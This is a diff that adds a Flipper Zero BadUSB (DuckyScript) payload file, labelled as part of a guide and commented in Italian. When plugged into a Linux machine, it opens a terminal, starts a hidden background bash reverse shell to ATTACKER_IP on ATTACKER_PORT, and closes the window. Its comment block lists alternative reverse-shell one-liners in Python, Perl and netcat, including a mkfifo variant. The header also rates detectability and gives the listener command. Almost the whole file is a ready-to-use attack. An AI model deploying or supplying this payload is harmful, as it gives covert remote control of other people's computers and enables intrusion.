@@ -1,0 +1,40 @@
+REM ============================================================
+REM Title:    Linux Reverse Shell
+REM Target:   Linux (Ubuntu/Debian/Fedora/Kali)
+REM Author:   FlipperZero-guide
+REM Category: Reverse Shell
+REM Privs:    User (no root)
+REM Layout:   US
+REM Time:     ~6 secondi
+REM Detect:   Medio - dipende da auditd/syslog config
+REM Desc:     Apre un terminale e lancia reverse shell bash.
+REM           Listener: nc -lvnp ATTACKER_PORT
+REM CHANGE:   ATTACKER_IP e ATTACKER_PORT
+REM ============================================================
+
+DELAY 2000
+REM Apri terminale (Ctrl+Alt+T su Ubuntu/Debian)
+CTRL ALT t
+DELAY 1500
+
+STRING nohup bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1' &>/dev/null &
+ENTER
+DELAY 500
+STRING exit
+ENTER
+
+REM ============================================================
+REM Alternative se bash /dev/tcp non funziona:
+REM
+REM Python:
+REM python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",ATTACKER_PORT));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
+REM
+REM Perl:
+REM perl -e 'use Socket;$i="ATTACKER_IP";$p=ATTACKER_PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
+REM
+REM Netcat (se disponibile):
+REM nc -e /bin/bash ATTACKER_IP ATTACKER_PORT
+REM
+REM Netcat senza -e (OpenBSD variant):
+REM rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ATTACKER_IP ATTACKER_PORT >/tmp/f
+REM ============================================================
